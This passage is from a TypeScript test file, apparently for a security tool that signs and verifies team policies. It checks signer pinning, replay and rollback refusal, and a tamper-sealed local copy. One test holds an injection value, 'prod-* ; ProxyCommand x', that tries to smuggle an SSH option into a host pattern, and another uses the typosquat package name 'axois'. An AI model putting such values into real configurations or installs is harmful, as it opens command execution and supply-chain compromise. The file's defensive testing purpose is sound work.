    expect(sigFile).toBe(`${file}.sig`);
    writeFileSync(join(dir, "allowed"), `laptop@test ${readFileSync(`${key}.pub`, "utf8").split(" ").slice(0, 2).join(" ")}\n`);
    const verify = (data: string) => Bun.spawnSync(["ssh-keygen", "-Y", "verify", "-f", join(dir, "allowed"), "-I", "laptop@test", "-n", REPORT_NAMESPACE, "-s", sigFile], { stdin: new Blob([data]) }).exitCode;
    expect(verify(readFileSync(file, "utf8"))).toBe(0);
    expect(verify(text.replace('"block"', '"pass"'))).not.toBe(0);
    await expect(signReport(text, join(dir, "missing"))).rejects.toThrow("could not sign");
  }), 60_000);
});

describe("team policy: signed, pinned on first use, never rolled back", () => {
  const hasTools = !WIN && !!Bun.which("ssh-keygen") && !!Bun.which("git");
  const sh = (cmd: string[], cwd?: string) => {
    const r = Bun.spawnSync(cmd, { cwd, stdout: "pipe", stderr: "pipe" });
    if (r.exitCode !== 0) throw new Error(`${cmd.join(" ")}: ${r.stderr.toString()}`);
    return r.stdout.toString();
  };
  // Commits in a throwaway repository; never the user's identity, hooks or commit signing.
  const gitc = (repo: string, ...a: string[]) => sh(["git", "-c", "user.name=t", "-c", "user.email=t@example.invalid", "-c", "commit.gpgsign=false", "-c", "core.hooksPath=/dev/null", "-C", repo, ...a]);
  const key = (dir: string, name: string) => {
    sh(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", name, "-f", join(dir, name)]);
    return { path: join(dir, name), line: `${name}@team namespaces="vswarm-team" ${readFileSync(join(dir, name + ".pub"), "utf8").split(" ").slice(0, 2).join(" ")}` };
  };
  const policy = (serial: number, extra: object = {}) => JSON.stringify({ "vswarm-team": 1, name: "acme", serial, ...extra }, null, 2) + "\n";

  async function teamRepo() {
    const keys = tmp("team-keys");
    const repo = tmp("team-repo");
    const alice = key(keys, "alice");
    const mallory = key(keys, "mallory");
    sh(["git", "init", "-q", repo]);
    writeFileSync(join(repo, "allowed_signers"), alice.line + "\n");
    const publish = async (text: string, by = alice) => {
      writeFileSync(join(repo, "vswarm-team.json"), text);
      rmSync(join(repo, "vswarm-team.json.sig"), { force: true });
      await signPolicy(join(repo, "vswarm-team.json"), by.path);
      gitc(repo, "add", "-A");
      gitc(repo, "commit", "-q", "-m", "policy");
    };
    return { repo, alice, mallory, publish };
  }

  const withTeam = <T>(fn: () => Promise<T>) => withState(async () => {
    const prev = process.env.VSWARM_TEAM_DIR;
    process.env.VSWARM_TEAM_DIR = tmp("team");
    try {
      return await fn();
    } finally {
      if (prev === undefined) delete process.env.VSWARM_TEAM_DIR;
      else process.env.VSWARM_TEAM_DIR = prev;
    }
  });

  test("the policy's shape is checked before anything of it is used", () => {
    expect(parsePolicy(policy(3, { accept: ["secret:env-files"], gate: { ssh: ["prod-*"] } })).serial).toBe(3);
    expect(() => parsePolicy("{")).toThrow("not valid JSON");
    expect(() => parsePolicy(JSON.stringify({ name: "x", serial: 1 }))).toThrow('"vswarm-team": 1');
    expect(() => parsePolicy(policy(0))).toThrow("serial");
    expect(() => parsePolicy(policy(1, { gate: { ssh: ["prod-* ; ProxyCommand x"] } }))).toThrow("ssh host pattern");
    expect(() => parsePolicy(policy(1, { accept: [1] }))).toThrow("accept");
    expect(matches(["conn-unsigned:/usr/local/bin/*", "secret:env-files"], "conn-unsigned:/usr/local/bin/tool")).toBe(true);
    expect(matches(["secret:env-files"], "secret:env-files-x")).toBe(false);
  });

  test.skipIf(!hasTools)("join pins the signers only after they are confirmed, and only a policy they signed is taken", () => withTeam(async () => {
    const t = await teamRepo();
    await t.publish(policy(1, { accept: ["secret:env-files"], allow: { npm: ["@acme/*", "axois"] } }));
    // Not confirmed: nothing kept.
    await expect(teamJoin(t.repo, async () => false)).rejects.toThrow("not confirmed");
    expect((await loadPolicy()).policy).toBeUndefined();
    let seen: { fp: string }[] = [];
    const j = await teamJoin(t.repo, async (keys) => ((seen = keys), true));
    expect(j.policy.name).toBe("acme");
    expect(j.signer).toBe("alice@team");
    expect(seen[0].fp).toMatch(/^SHA256:/);
    expect((await loadPolicy()).policy?.serial).toBe(1);
    // The team's own names are not look-alikes once the policy is applied.
    applyAllow((await loadPolicy()).policy);
    expect(lookAlike("npm", "axois")).toBeUndefined();
    applyAllow(undefined);
    expect(lookAlike("npm", "axois")).toBe("axios");
    await expect(teamJoin(t.repo, async () => true)).rejects.toThrow("already follows");

    // A newer policy signed by the pinned key: taken.
    await t.publish(policy(2, { accept: ["secret:env-files"] }));
    expect((await teamSync()).policy.serial).toBe(2);
    // Changed without a new signature: refused, and the policy here stays as it was.
    writeFileSync(join(t.repo, "vswarm-team.json"), policy(3, { accept: ["*"] }));
    gitc(t.repo, "commit", "-q", "-am", "edit");
    await expect(teamSync()).rejects.toThrow("does not verify");
    expect((await loadPolicy()).policy?.serial).toBe(2);
    // Signed by someone the repository does not list: refused.
    await t.publish(policy(3), t.mallory);
    await expect(teamSync()).rejects.toThrow("not signed by a key");
    // The repository lists a new signer: a decision for people, so a sync refuses it even when it is signed.
    writeFileSync(join(t.repo, "allowed_signers"), `${t.alice.line}\n${t.mallory.line}\n`);
    await t.publish(policy(4), t.mallory);
    await expect(teamSync()).rejects.toThrow("different signers");
    // An older policy, properly signed (a replay): refused.
    writeFileSync(join(t.repo, "allowed_signers"), `${t.alice.line}\n`);
    await t.publish(policy(1));
    await expect(teamSync()).rejects.toThrow("older than the one here");
    expect((await loadPolicy()).policy?.serial).toBe(2);
  }), 60_000);

  test.skipIf(!hasTools)("a repository without a signature is not joined", () => withTeam(async () => {
    const t = await teamRepo();
    writeFileSync(join(t.repo, "vswarm-team.json"), policy(1));
    gitc(t.repo, "add", "-A");
    gitc(t.repo, "commit", "-q", "-m", "unsigned");
    await expect(teamJoin(t.repo, async () => true)).rejects.toThrow("not signed");
    expect((await loadPolicy()).policy).toBeUndefined();
  }), 60_000);

  test.skipIf(!hasTools)("in a check: team-accepted findings drop out, requirements warn, and a hand-edited local copy is not used", () => withTeam(async () => {
    const t = await teamRepo();
    await t.publish(policy(1, { accept: ["file:.zshrc:*"], require: { baseline: true, baselineMaxDays: 30 }, gate: { ssh: ["prod-*"] } }));
    await teamJoin(t.repo, async () => true);
    const m = await machine();
    m.plant();
    const r = await check(m.ctx, { offline: true });
    expect(r.findings.some((f) => f.rule === "startup-file")).toBe(false);
    expect(r.accepted).toBeGreaterThan(0);
    expect(r.findings.filter((f) => f.rule === "team-require").map((f) => f.id)).toEqual(["team:gate"]);
    expect(r.verdict).toBe("warn");
    // The local copy is sealed: edited by hand, it is set aside and said so.
    const local = join(process.env.VSWARM_TEAM_DIR!, "policy.json");
    writeFileSync(local, readFileSync(local, "utf8").replace(`"file:.zshrc:*"`, `"*"`));
    expect((await loadPolicy()).untrusted).toContain("seal does not match");
    const again = await check(m.ctx, { offline: true });
    expect(again.findings.some((f) => f.rule === "startup-file")).toBe(true);
    expect(again.findings.some((f) => f.id === "vswarm-state:team-policy")).toBe(true);
    // The report carries the team, for a team that collects them.
    expect(posture(r, { name: "acme", serial: 1 }).team).toEqual({ name: "acme", serial: 1 });
  }), 60_000);
});
